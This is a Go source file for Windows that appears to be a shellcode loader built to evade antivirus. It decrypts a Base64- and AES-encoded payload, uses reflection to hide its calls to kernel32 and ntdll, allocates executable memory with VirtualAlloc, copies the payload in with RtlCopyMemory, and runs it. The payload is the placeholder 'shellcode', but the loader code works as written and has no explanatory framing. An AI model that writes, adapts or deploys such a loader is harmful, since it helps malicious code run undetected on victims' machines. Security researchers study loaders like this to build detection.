package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"reflect"
	"strings"
	"syscall"
	"unsafe"
)

func jiemi(str string) []byte {
	decodeBytes, _ := base64.StdEncoding.DecodeString(str)

	key := string(decodeBytes)[0:16]
	a := Get_Aes_decode(strings.Replace(string(decodeBytes), key, "", 1), key)

	decodeBytes1, _ := base64.StdEncoding.DecodeString(a)

	return decodeBytes1
}
func Get_Aes_decode(str string, keys string) string {
	x := []byte(str)
	key := []byte(keys)
	x1 := decryptAES(x, key)
	return string(x1)
}
func decryptAES(res []byte, key []byte) []byte {
	data, _ := aes.NewCipher(key)
	//解密
	data2 := cipher.NewCBCDecrypter(data, key)
	//使用cbc解密方式

	data2.CryptBlocks(res, res)
	res = unpadding(res)
	return res
}
func unpadding(src []byte) []byte {
	n := len(src)
	unpadnum := int(src[n-1])
	return src[:n-unpadnum]
}

var (
	jz *syscall.DLL
	jd *syscall.DLL
	cs *syscall.Proc
	js *syscall.Proc
	sh []byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func import_dll() {
	jz = str_func(syscall.MustLoadDLL, "kernel32.dll")[0].Interface().(*syscall.DLL)
	jd = str_func(syscall.MustLoadDLL, "ntdll.dll")[0].Interface().(*syscall.DLL)
	cs = str_func(jz.MustFindProc, "VirtualAlloc")[0].Interface().(*syscall.Proc)
	js = str_func(jd.MustFindProc, "RtlCopyMemory")[0].Interface().(*syscall.Proc)
}
func str_func(lo interface{}, ca ...interface{}) []reflect.Value {
	a := reflect.ValueOf(lo)
	paramList := []reflect.Value{}
	for i := 0; i < len(ca); i++ {
		paramList = append(paramList, reflect.ValueOf(ca[i]))
	}
	res := a.Call(paramList)
	return res
}

func main() {
	data := "shellcode"
	sh = str_func(jiemi, string(data))[0].Bytes()
	import_dll()
	addr, _, _ := cs.Call(0, uintptr(len(sh)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	str_func(js.Call, addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
	syscall.Syscall(addr, 0, 0, 0, 0)
}
